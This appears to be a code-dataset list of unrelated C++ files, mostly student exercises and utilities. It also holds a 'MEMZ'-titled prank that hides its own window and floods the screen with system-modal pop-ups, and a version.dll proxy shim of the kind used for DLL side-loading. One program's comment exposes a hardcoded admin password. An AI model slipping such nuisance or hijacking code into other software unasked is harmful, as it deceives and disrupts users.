    "#include <iostream>\n#include <string>\n#include <iomanip>\n#include <vector>\n#include <cstdlib>\n#include <fstream>\n#include \"header.h\"\nusing namespace std;\n\n/*! \\mainpage Wykaz sprzetu w firmie\n *\n *\n * \\section intro_sec Tresc zadania\n * Napisac program realizujacy zadania zwiazane z zarzadzaniem i wyswietlaniem spisu sprzetu w firmie.\n * \\section test_sec Plik testowy\n * W zalaczonych plikach znajduje sie plik tekstowy zawierajacy 60 wierszy.\n * Plik ten jest reprezentacja bazy danych sprzetu w firmie.\n * Kazdy wiersz ma nastepujaca budowe:\n * <unikatowy numer id> <nazwa_sprzetu> <nazwa_dzialu>\n *\n *\n * \\section instr_sec Instrukcja\n * Po uruchomieniu programu uzytkownik ma do wyboru dwie opcje:\n * 1) Wyswietlenie pelnego wykazu sprzetu - ta opcja pozwala na wyswietlenie pelnej listy sprzetu znajdujacego sie w firmie.\n * 2) Zalogowanie sie na konto Admin w celu zdobycia wiekszej ilosci uprawnie\u0144 - ta opcja umozliwia uzytkownikowi dostep do konta administracyjnego i dodatkowych funkcjonalnosci.\n *\n * Haslo pozwalajace na przelaczenie konta z domyslnego na administracyjne to \"Pk2ktW\".\n * Uwaga: Wielkosc i kolejnosc liter maja znaczenie!\n *\n * Po zalogowaniu sie na konto Admin, uzytkownik moze korzystac z nastepujacych opcji:\n * a) Dodawanie - ta opcja pozwala na dodawanie nowego sprzetu do bazy danych.\n * b) Usuwanie - ta opcja pozwala na usuwanie konkretnego sprzetu/ przedmiotu z bazy danych.\n * c) Modyfikacja - ta opcja umozliwia modyfikowanie informacji o konkretnym sprzecie znajdujacym sie w bazie danych.\n * d) Opcja \u201cfind\u201d - ta opcja pozwala na wyszukiwanie sprzetu w bazie danych za pomoca nazwy lub numeru ID.\n * e) Wyswietlenie wzgledem konkretnego dzialu w firmie - ta opcja umozliwia wyswietlenie sprzetu zwiazane z danym dzialem w firmie.\n *\n *\\author Maciej Fajlhauer\n *\n */\nint main() {\n\t\n    EquipmentDatabase db;\n\n\tcout << \"---------------------------\" << endl;\n\tcout<< \"Witamy w programie WykaZ\"<<endl;\n\tcout  << \"---------------------------\" << endl;\n\tsystem(\"pause\");\n\tsystem(\"cls\");\n\tcout << \"Aby wczytac baze sprzetu podaj nazwe pliku o rozszerzeniu .txt: \" << endl;\n\t\n\tstring filename;\n\tifstream wykaz;\n\tcin >> filename;\n\twykaz.open(filename);\n\tif (wykaz.good() == true)\n\t{\n\t\tsystem(\"pause\");\n\t\tsystem(\"cls\");\n\t\tcout << \"Uzyskano dostep do pliku!\" <<endl;\n\t\tint id;\n        string name, department;\n        while (wykaz >> id >> name >> department) {\n            db.addEquipment(Equipment(id, name, department));\n\t\t\t\n        }\n        cout << \"Baza danych zostala wczytana z pliku \" << filename << endl;\n        system(\"pause\");\n        system(\"cls\");\n        logowanie(db);\n\t\t\n\t}\n\telse cout << \"Dostep do pliku zostal zabroniony!\" <<endl;\n\n\t//zamkni\u0119cie pliku\n\twykaz.close();\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_iith\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/***********************************************************************\n// OOP244 Workshop #1 : Lab tester program\n//\n// File\tmain.cpp\n// Version 1.0\n// Date 2024-08-20\n// Author Fardad\n// Description\n//\n// Revision History\n// -----------------------------------------------------------\n// Name            Date            Reason\n//\n/////////////////////////////////////////////////////////////////\n***********************************************************************/\n\n#include <iostream>\n#include \"utils.h\"\n#include \"movie.h\"\nusing namespace std;\nusing namespace seneca;\n\nint main() {\n   bool done = false;\n   char genre[128];\n   loadMovies();\n   cout << \"Welcome to 50 top movies of all times \\\"genre\\\" search.\" << endl << endl;\n   while (!done) {\n      cout << \"Enter the movie genre to start the search: \";\n      cin >> genre;\n      flushkeys();\n      displayMoviesWithGenre(genre);\n      cout << \"Do another search? (Y)es: \";\n      done = !yes();\n      cout << endl;\n   }\n   cout << \"Goodbye!\" << endl;\n   return 0;\n}",
    "/*\nThe MIT License (MIT)\n\nCopyright (c) 2024 sigma-axis\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \u201cSoftware\u201d), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \u201cAS IS\u201d, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include <cstdint>\n#include <algorithm>\n#include <cmath>\n\n#define NOMINMAX\n#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#pragma comment(lib, \"imm32\")\n#include <CommCtrl.h>\n#include <Shlwapi.h>\n\nusing byte = uint8_t;\n#include <exedit.hpp>\n\n#include \"color_abgr.hpp\"\nnamespace gdi = sigma_lib::W32::GDI;\n\n////////////////////////////////\n// \u4e3b\u8981\u60c5\u5831\u6e90\u306e\u5909\u6570\u30a2\u30c9\u30ec\u30b9\uff0e\n////////////////////////////////\ninline constinit struct ExEdit092 {\n\tAviUtl::FilterPlugin* fp;\n\tconstexpr static auto info_exedit092 = \"\u62e1\u5f35\u7de8\u96c6(exedit) version 0.92 by \uff2b\uff25\uff2e\u304f\u3093\";\n\tbool init(AviUtl::FilterPlugin* this_fp)\n\t{\n\t\tif (fp != nullptr) return true;\n\n\t\tAviUtl::SysInfo si; this_fp->exfunc->get_sys_info(nullptr, &si);\n\n\t\tfor (int i = 0; i < si.filter_n; i++) {\n\t\t\tauto that_fp = this_fp->exfunc->get_filterp(i);\n\t\t\tif (that_fp->information != nullptr &&\n\t\t\t\t0 == std::strcmp(that_fp->information, info_exedit092)) {\n\t\t\t\tfp = that_fp;\n\t\t\t\tinit_pointers();\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t\treturn false;\n\t}\n\n\tint32_t*\tlayer_size_mode;\t\t// 0x1539d4; 0: large, 1: medium, 2: small.\n\tint32_t(*\tlayer_size_preset)[3];\t// 0x0a3e08\n\tint32_t(*\tmidpt_mk_sz_preset)[3];\t// 0x0a3e14\n\tint32_t*\tlayer_size;\t\t\t\t// 0x0a3e20\n\tint32_t*\tmidpt_marker_size;\t\t// 0x0a3e24\n\n\tSIZE*\t\ttimeline_size;\t\t\t// 0x1a52fc, excludes right vertical scroll bar.\n\tdecltype(AviUtl::FilterPlugin::func_WndProc) func_wndproc;\n\nprivate:\n\tvoid init_pointers()\n\t{\n\t\tauto pick_addr = [exedit_base = reinterpret_cast<uintptr_t>(fp->dll_hinst)]\n\t\t\t<class T>(T& target, ptrdiff_t offset) { target = reinterpret_cast<T>(exedit_base + offset); };\n\n\t\tpick_addr(layer_size_mode,\t\t\t0x1539d4);\n\t\tpick_addr(layer_size_preset,\t\t0x0a3e08);\n\t\tpick_addr(midpt_mk_sz_preset,\t\t0x0a3e14);\n\t\tpick_addr(layer_size,\t\t\t\t0x0a3e20);\n\t\tpick_addr(midpt_marker_size,\t\t0x0a3e24);\n\n\t\tpick_addr(timeline_size,\t\t\t0x1a52fc);\n\t}\n} exedit;\n\n\n////////////////////////////////\n// \u30c7\u30fc\u30bf\u6388\u53d7\u306e\u4e2d\u6838\u30af\u30e9\u30b9\uff0e\n////////////////////////////////\nstruct layer_sizes {\n\tint32_t L, M, S;\n\tint32_t& operator[](int32_t i) {\n\t\treturn i > 0 ? i > 1 ? S : M : L;\n\t}\n};\nstatic constinit struct GuiData {\n\tint32_t mode_curr = 0;\n\tint32_t size_curr = 0, size_pend = 0;\n\tAviUtl::FilterPlugin* fp = nullptr;\n\tlayer_sizes def_layer_sizes{ 0, 0, 0 };\n\n\tvoid init(AviUtl::FilterPlugin* this_fp) {\n\t\tfp = this_fp;\n\t}\n\tvoid exit() {\n\t\tkill_timer();\n\t}\n\t// returns whether the state had changed by pulling data.\n\tbool pull()\n\t{\n\t\tkill_timer();\n\n\t\tif (auto mode_prev = std::exchange(mode_curr, *exedit.layer_size_mode);\n\t\t\tmode_prev != mode_curr) {\n\t\t\tsize_curr = (*exedit.layer_size_preset)[mode_curr];\n\t\t\treturn true;\n\t\t}\n\n\t\tif (auto size_prev = std::exchange(size_curr, (*exedit.layer_size_preset)[mode_curr]);\n\t\t\tsize_prev != size_curr) {\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}\n\t// returns whether the new value is (or is being) applied.\n\tbool push(int32_t size_new, int delay)\n\t{\n\t\tif (size_pend == size_new) return false;\n\t\tif (size_curr == size_new) {\n\t\t\tkill_timer();\n\t\t\treturn false;\n\t\t}\n\n\t\tif (delay <= 0) return push_core(size_new);\n\n\t\tsize_pend = size_new;\n\t\t::SetTimer(fp->hwnd, timer_id(), delay, on_timer);\n\t\treturn true;\n\t}\n\tbool flush()\n\t{\n\t\tif (!is_timer_active()) return false;\n\n\t\t::KillTimer(fp->hwnd, timer_id());\n\t\ton_timer();\n\t\treturn true;\n\t}\n\tbool set_mode(int32_t mode)\n\t{\n\t\tif (mode_curr == mode) return false;\n\t\tflush();\n\n\t\tmode_curr = *exedit.layer_size_mode = mode;\n\t\t*exedit.midpt_marker_size = (*exedit.midpt_mk_sz_preset)[mode];\n\t\treturn push_core((*exedit.layer_size_preset)[mode]);\n\t}\n\n\tvoid load(int32_t prev_L, int32_t prev_M, int32_t prev_S) {\n\t\tdef_layer_sizes = save();\n\n\t\tif (prev_L > 0) (*exedit.layer_size_preset)[0] = prev_L;\n\t\tif (prev_M > 0) (*exedit.layer_size_preset)[1] = prev_M;\n\t\tif (prev_S > 0) (*exedit.layer_size_preset)[2] = prev_S;\n\n\t\t*exedit.layer_size = (*exedit.layer_size_preset)[*exedit.layer_size_mode];\n\t}\n\tstatic layer_sizes save() {\n\t\treturn {\n\t\t\t.L = (*exedit.layer_size_preset)[0],\n\t\t\t.M = (*exedit.layer_size_pre",
    "#include <iostream>\n#include <cstdlib>\n#include <cmath>\n\nusing namespace std;\n\nconst int dimensioneMax=100;\n\n\n//prototipi\nint caricaVettore(float numeri[]);\nfloat media(int n, float num[]);\nvoid caricaScarti(int n, float v[], float v2[], float m);\nvoid scartoQuadraticoMedio(int n, float v2[]);\nvoid OrdinamentoERicerca(float v[], float v2[], int n);\nvoid Ordinamento(float v[], int n);\nvoid Ricerca(float v[], int n);\nvoid stampa(float v[], int n);\nint MiniMenu();\nint Menu();\n\n\nint main() {\n    \n    float valori[dimensioneMax];\n    float scarti[dimensioneMax];\n    float m=0.00;\n    int n;\n    int scelta;\n    \n    n=caricaVettore(valori);\n    \n    do {\n        scelta=Menu();\n        switch(scelta) {\n            case 1:\n                stampa(valori, n);\n            break;\n            case 2:\n                m=media(n, valori);\n                caricaScarti(n, valori, scarti, m);\n            break;\n            case 3:\n                scartoQuadraticoMedio(n, scarti);\n            break;\n            case 4:\n                OrdinamentoERicerca(valori, scarti, n);\n            break;\n            case 0:\n                cout<<\"Esci\"<<endl;\n            break;\n            default:\n                cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n            break;\n        }\n    }while(scelta!=0);\n\n    return 0;\n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Stampa vettore VALORI\"<<endl;\n  cout<<\"2-Carica vettore SCARTI\"<<endl;\n  cout<<\"3-Calcola scarto quadratico medio\"<<endl;\n  cout<<\"4-Ricerca dicotomica\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\nint caricaVettore(float numeri[]) {\n    \n    int i=0;\n    char risp;\n    \n    do {\n        cout<<\"Inserisci una misurazione: \";\n        cin>>numeri[i];\n        cout<<\"Vuoi inserire un'altra misurazione ? (S/N): \";\n        cin>>risp;\n        i++;\n    }while(risp=='s'||risp=='S');\n    \n    return i;\n    \n}\n\nfloat media(int n, float num[]) {\n    float m=0.00;\n    float s=0.00;\n    \n    for(int i=0; i<n; i++) {\n        s=s+num[i];\n    }\n    \n    m=s/n;\n    \n    return m;\n}\n\nvoid caricaScarti(int n, float v[], float v2[], float m) {\n    \n    cout<<endl;\n    \n    for(int i=0; i<n; i++) {\n        v2[i]=abs(v[i]-m);\n    }\n    \n    cout<<endl;\n    \n    stampa(v2, n);\n    \n    cout<<endl;\n    \n    cout<<\"Caricamento vettore SCARTI completato.\"<<endl;\n    \n    cout<<endl;\n}\n\nvoid scartoQuadraticoMedio(int n, float v2[]) {\n    \n    float s=0.00;\n    float scartoQuadraticoMedio=0.00;\n    \n    for(int i=0; i<n; i++) {\n        s=s+(v2[i]*v2[i]);\n    }\n    \n    scartoQuadraticoMedio=sqrt(s/n);\n    \n    \n    cout<<\"Lo scarto quadratico medio e' : \"<<scartoQuadraticoMedio;\n    \n    \n}\n\nvoid stampa(float v[], int n) {\n    \n    for(int i=0; i<n; i++) {\n        cout<<v[i]<<endl;\n    }\n    \n}\n\nint MiniMenu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Ricerca dicotomica nel vettore VALORI\"<<endl;\n  cout<<\"2-Ricerca dicotomica nel vettore SCARTI\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli; \n}\n\n\nvoid OrdinamentoERicerca(float v[], float v2[], int n) {\n    int scelta;\n    \n    do {\n       scelta=MiniMenu();\n       switch(scelta) {\n           case 1:\n               Ordinamento(v, n);\n               Ricerca(v, n);\n           break;\n           case 2:\n               Ordinamento(v2, n);\n               Ricerca(v2, n);\n           break;\n       }\n    }while(scelta!=0);\n    \n}\n\nvoid Ordinamento(float v[], int n) {\n    \n    float temp;\n    \n    for(int i=0; i<n-1; i++) {\n    for(int j=i+1; j<n; j++) {\n      if(v[i]>v[j]) {\n        temp=v[i];\n        v[i]=v[j];\n        v[j]=temp;\n      }\n    }\n  }\n    \n}\n\nvoid Ricerca(float v[], int n) {\n  int i=0;\n  int inizio=0;\n  bool trovato=false;\n  int fine=n-1;\n  float chiave;\n\n  cout<<\"Inserisci il dato da cercare: \";\n  cin>>chiave;\n\n  while(trovato==false&&inizio<=fine) {\n    i=(inizio+fine)/2;\n    if(v[i]==chiave) {\n      trovato=true;\n    } else {\n      if(v[i]>chiave) {\n        fine=i-1;\n      } else {\n        inizio=i+1;\n      }\n    }\n  }\n\n  if(trovato==false) {\n    cout<<\"Dato non trovato\"<<endl;\n  } else {\n    cout<<\"Dato trovato\"<<endl;\n  }  \n}\n",
    "#include <Windows.h>\n#include <process.h>\n#include <stdio.h>\n#include \"CLockFreeObjectPool.h\"\n\n#define QUEUE_TEST\n\n#ifdef FREELIST_TEST\nconstexpr int THREAD_NUM = 4;\n\nconstexpr int TEST_NUM = 10000000;\n\nint arr[TEST_NUM];\n\n\nstruct Data\n{\n    int data;\n\n    Data() {};\n};\n\nCLockFreeObjectPool<Data,false> fr;\n\nunsigned int WINAPI ThreadProc(LPVOID pParam)\n{\n    for (int i = 0; i < TEST_NUM / THREAD_NUM; i++)\n    {\n        Data* pd = fr.Alloc();\n        pd->data = i;\n        arr[pd->data]++;\n    }\n\n    return 0;\n}\n\nData* pArr[TEST_NUM];\n\nint wmain()\n{\n    CAddressTranslator::CheckMetaCntBits();\n    for (int i = 0; i < TEST_NUM; ++i)\n    {\n        pArr[i] = fr.Alloc();\n    }\n    \n    for (int i = 0; i < TEST_NUM; ++i)\n    {\n        fr.Free(pArr[i]);\n    }\n\n    HANDLE threads[THREAD_NUM];\n\n    for (int i = 0; i < THREAD_NUM; i++)\n    {\n        threads[i] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, nullptr, CREATE_SUSPENDED, nullptr);\n    }\n\n    for (int i = 0; i < THREAD_NUM; i++)\n    {\n        ResumeThread(threads[i]);\n    }\n\n    WaitForMultipleObjects(THREAD_NUM, threads, TRUE, INFINITE);\n\n\n    for (int i = 0; i < TEST_NUM; i++)\n    {\n        if (arr[i] != 1)\n        {\n            __debugbreak();\n        }\n    }\n\n    for (int i = 0; i < TEST_NUM; ++i)\n    {\n        fr.Free(pArr[i]);\n    }\n\n    //Clear(&fr);\n\n    printf(\"ZZANG~\");\n}\n#endif\n\n#ifdef STACK_TEST\n#include <windows.h>\n#include <process.h>\n#include \"LFStack.h\"\n#include \"CLockFreeStack.h\"\n\nstruct Data\n{\n    int a;\n    double b;\n    uint64_t c;\n\n    Data() {};\n\n    Data(const Data& other)\n        :a{ 1 }, b{ 2 }, c{ 3 }\n    {\n    }\n\n    Data(Data&& other)\n        :a{ 3 }, b{ 2 }, c{ 1 }\n    {\n        printf(\"move\\n\");\n    }\n};\n\nCLockFreeStack<int> stack;\n\nunsigned _stdcall ThreadProc(void* pParam)\n{\n    while (true)\n    {\n        for (int i = 0; i < 200000; ++i)\n        {\n            stack.Push(i);\n        }\n\n        for (int i = 0; i < 200000; ++i)\n        {\n            std::optional<int> popRet = stack.Pop();\n            if (!popRet.has_value())\n                __debugbreak();\n\n        }\n    }\n}\n\n\nint main()\n{\n    CAddressTranslator::CheckMetaCntBits();\n\n    HANDLE hThreadArr[2];\n    hThreadArr[0] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, nullptr, 0, nullptr);\n    //hThreadArr[1] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, nullptr, 0, nullptr);\n\n    WaitForMultipleObjects(1, hThreadArr, TRUE, INFINITE);\n}\n#endif\n\n\n#ifdef QUEUE_TEST\n#include \"CLockFreeQueue.h\"\n\nHANDLE hThread[2];\nCLockFreeQueue<uint64_t> q;\n\nunsigned ThreadProc(void* pParam);\n\nconstexpr auto LOOP = 2;\nconstexpr auto THREAD_NUM = 4;\n\nuint64_t g_enqCnt = 0;\n\nint main()\n{\n    if (!CAddressTranslator::CheckMetaCntBits())\n        __debugbreak();\n\n\n    hThread[0] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, (void*)1, CREATE_SUSPENDED, nullptr);\n    hThread[1] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, (void*)0, CREATE_SUSPENDED, nullptr);\n    hThread[2] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, (void*)0, CREATE_SUSPENDED, nullptr);\n    hThread[3] = (HANDLE)_beginthreadex(nullptr, 0, ThreadProc, (void*)0, CREATE_SUSPENDED, nullptr);\n\n    for (int i = 0; i < THREAD_NUM; ++i)\n    {\n        ResumeThread(hThread[i]);\n    }\n\n    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);\n}\n\nunsigned ThreadProc(void* pParam)\n{\n    while (true)\n    {\n        for (int i = 0; i < LOOP; ++i)\n        {\n            q.Enqueue(InterlockedIncrement(&g_enqCnt) - 1);\n        }\n\n        for (int i = 0; i < LOOP; ++i)\n        {\n            auto deqRet = q.Dequeue();\n            if (!deqRet.has_value())\n                __debugbreak();\n        }\n    }\n}\n#endif\n",
    "#include <windows.h>\r\n\r\nHCRYPTPROV prov;\r\n\r\nint random()\r\n{\r\n\tif (prov == NULL)\r\n\t{\r\n\t\tif (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))\r\n\t\t{\r\n\t\t\tExitProcess(1);\r\n\t\t}\r\n\t}\r\n\tint out;\r\n\tCryptGenRandom(prov, sizeof(out), (BYTE*)(&out));\r\n\treturn out & 0x7fffffff;\r\n}\r\n\r\nvoid mess1(LPVOID lp)\r\n{\r\n\tMessageBoxA(NULL, \"lol\", \"MEMZ\", MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);\r\n}\r\n\r\nvoid mess2(LPVOID lp)\r\n{\r\n\tMessageBoxA(NULL, \"lol\", \"MEMZ\", MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);\r\n}\r\n\r\nvoid mess3(LPVOID lp)\r\n{\r\n\tMessageBoxA(NULL, \"lol\", \"MEMZ\", MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);\r\n}\r\n\r\n//\u4e3b\u51fd\u6570\r\nvoid MainProgram()\r\n{\r\n\tint NumberOfMessageBox = 20;\r\n\tHWND hwnd[10005];\r\n\tHWND ThisProgram = GetForegroundWindow();\r\n\tNumberOfMessageBox += 3;\r\n\tShowWindow(ThisProgram, SW_HIDE);\r\n\tSleep(4000);\r\n\tfor (int i = 1; i <= NumberOfMessageBox / 3; i++)\r\n\t{\r\n\t\tCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mess1, 0, 0, 0);\r\n\t\tSleep(90);\r\n\t\thwnd[i] = FindWindowA(NULL, \"MEMZ\");\r\n\t\tShowWindow(hwnd[i], SW_HIDE);\r\n\t\tMoveWindow(hwnd[i], random() % 1920, random() % 1080, 220, 180, false);\r\n\t\tCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mess2, 0, 0, 0);\r\n\t\tSleep(90);\r\n\t\thwnd[i + 3334] = FindWindowA(NULL, \"MEMZ\");\r\n\t\tShowWindow(hwnd[i + 3334], SW_HIDE);\r\n\t\tMoveWindow(hwnd[i + 3334], random() % 1920, random() % 1080, 220, 180, false);\r\n\t\tCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mess3, 0, 0, 0);\r\n\t\tSleep(90);\r\n\t\thwnd[i + 6667] = FindWindowA(NULL, \"MEMZ\");\r\n\t\tShowWindow(hwnd[i + 6667], SW_HIDE);\r\n\t\tMoveWindow(hwnd[i + 6667], random() % 1920, random() % 1080, 220, 180, false);\r\n\t}\r\n\tSleep(1000);\r\n\tfor (int i = 1; i <= NumberOfMessageBox; i++)\r\n\t{\r\n\t\tShowWindow(hwnd[i], SW_SHOW);\r\n\t\tSleep(15);\r\n\t\tShowWindow(hwnd[i + 3334], SW_SHOW);\r\n\t\tSleep(15);\r\n\t\tShowWindow(hwnd[i + 6667], SW_SHOW);\r\n\t}\r\n\tSleep(1000);\r\n\tfor (int i = 1; i <= NumberOfMessageBox / 3; i++)\r\n\t{\r\n\t\tSendMessage(hwnd[i], WM_CLOSE, 0, 0);\r\n\t\tSleep(5);\r\n\t\tSendMessage(hwnd[i + 3334], WM_CLOSE, 0, 0);\r\n\t\tSleep(5);\r\n\t\tSendMessage(hwnd[i + 6667], WM_CLOSE, 0, 0);\r\n\t\tSleep(5);\r\n\t}\r\n\treturn;\r\n}\r\n\r\nint main()\r\n{\r\n\tMainProgram();\r\n\treturn 0;\r\n}\r\n",
    "#include \"common.hpp\"\n#if defined(EXPORT_VERSION_DLL_FUNCTIONS) && (EXPORT_VERSION_DLL_FUNCTIONS)\n#include \"version_dll.hpp\"\n\n///////////////////////////////////////////////////////////////\nstatic HMODULE hModuleDll = nullptr;\nstatic const wchar_t dllFname[] = L\"version\";\n\nnamespace version_dll {\n\nbool checkFname(const wchar_t* fname) {\n    return _wcsicmp(fname, dllFname) == 0;\n}\n\nvoid loadGenuineDll(const wchar_t* systemDirectory) {\n    DEBUG_TRACE(L\"loadGenuineDll : begin, dllFname=%s\", dllFname);\n    unloadGenuineDll();\n\n    // systemDirectory : \"C:\\Windows\\System32\"\n    // fullpathDllName : \"C:\\Windows\\System32\\<dllFname>.dll\"\n    wchar_t fullpathDllName[MAX_PATH];\n    int n = swprintf_s(fullpathDllName, MAX_PATH, L\"%s\\\\%s.dll\", systemDirectory, dllFname);\n    if (n >= MAX_PATH)\n        fullpathDllName[MAX_PATH - 1] = L'\\0';\n    DEBUG_TRACE(L\"loadGenuineDll : fullpathDllName = %s\", fullpathDllName);\n\n    // Load \"genuine\" DLL\n    hModuleDll = LoadLibraryW(fullpathDllName);\n    DEBUG_TRACE(L\"hModuleDll(%s) = 0x%p\", fullpathDllName, hModuleDll);\n\n    DEBUG_TRACE(L\"loadGenuineDll : end\");\n}\n\nvoid unloadGenuineDll() {\n    if(hModuleDll == nullptr) {\n        return;\n    }\n    FreeLibrary(hModuleDll);\n    hModuleDll = nullptr;\n}\n\n} // namespace version_dll\n\n\n///////////////////////////////////////////////////////////////\ntemplate<typename T>\nvoid setup(T*& funcPtr, const char* funcName) {\n    if(funcPtr != nullptr) {\n        return;\n    }\n    funcPtr = reinterpret_cast<T*>(GetProcAddress(hModuleDll, funcName));\n}\n\n#define D(funcname, ...)            \\\n    static decltype(funcname)* p;   \\\n    setup(p, #funcname);            \\\n    return p(__VA_ARGS__);          \\\n    __pragma(comment(linker, \"/EXPORT:\" __FUNCTION__ \"=\" __FUNCDNAME__))\n\n\n// Function Name     : GetFileVersionInfoA\n// Ordinal           : 1 (0x1)\nextern \"C\"    BOOL WINAPI  GetFileVersionInfoA (LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {\n    D(GetFileVersionInfoA, lptstrFilename, dwHandle, dwLen, lpData);\n}\n\n\n// Function Name     : GetFileVersionInfoByHandle\n// Ordinal           : 2 (0x2)\nextern \"C\" int WINAPI  GetFileVersionInfoByHandle (int hMem, LPCWSTR lpFileName, int v2, int v3) {\n    D(GetFileVersionInfoByHandle, hMem, lpFileName, v2, v3);\n}\n\n\n// Function Name     : GetFileVersionInfoExA\n// Ordinal           : 3 (0x3)\nextern \"C\" BOOL WINAPI  GetFileVersionInfoExA (DWORD dwFlags, LPCSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {\n    D(GetFileVersionInfoExA, dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);\n}\n\n\n// Function Name     : GetFileVersionInfoExW\n// Ordinal           : 4 (0x4)\nextern \"C\" BOOL WINAPI  GetFileVersionInfoExW (DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {\n    D(GetFileVersionInfoExW, dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);\n}\n\n\n// Function Name     : GetFileVersionInfoSizeA\n// Ordinal           : 5 (0x5)\nextern \"C\" DWORD WINAPI  GetFileVersionInfoSizeA (LPCSTR lptstrFilename, LPDWORD lpdwHandle) {\n    D(GetFileVersionInfoSizeA, lptstrFilename, lpdwHandle);\n}\n\n\n// Function Name     : GetFileVersionInfoSizeExA\n// Ordinal           : 6 (0x6)\nextern \"C\" DWORD WINAPI  GetFileVersionInfoSizeExA (DWORD dwFlags, LPCSTR lpwstrFilename, LPDWORD lpdwHandle) {\n    D(GetFileVersionInfoSizeExA, dwFlags, lpwstrFilename, lpdwHandle);\n}\n\n\n// Function Name     : GetFileVersionInfoSizeExW\n// Ordinal           : 7 (0x7)\nextern \"C\" DWORD WINAPI  GetFileVersionInfoSizeExW (DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {\n    D(GetFileVersionInfoSizeExW, dwFlags, lpwstrFilename, lpdwHandle);\n}\n\n\n// Function Name     : GetFileVersionInfoSizeW\n// Ordinal           : 8 (0x8)\nextern \"C\" DWORD WINAPI   GetFileVersionInfoSizeW (LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {\n    D(GetFileVersionInfoSizeW, lptstrFilename, lpdwHandle);\n}\n\n\n// Function Name     : GetFileVersionInfoW\n// Ordinal           : 9 (0x9)\nextern \"C\" BOOL WINAPI  GetFileVersionInfoW (LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {\n    D(GetFileVersionInfoW, lptstrFilename, dwHandle, dwLen, lpData);\n}\n\n\n// Function Name     : VerFindFileA\n// Ordinal           : 10 (0xa)\nextern \"C\" DWORD WINAPI  VerFindFileA (DWORD uFlags, LPCSTR szFileName, LPCSTR szWinDir, LPCSTR szAppDir, LPSTR szCurDir, PUINT lpuCurDirLen, LPSTR szDestDir, PUINT lpuDestDirLen) {\n    D(VerFindFileA, uFlags, szFileName, szWinDir, szAppDir, szCurDir, lpuCurDirLen, szDestDir, lpuDestDirLen);\n}\n\n\n// Function Name     : VerFindFileW\n// Ordinal           : 11 (0xb)\nextern \"C\" DWORD WINAPI  VerFindFileW (DWORD uFlags, LPCWSTR szFileName, LPCWSTR 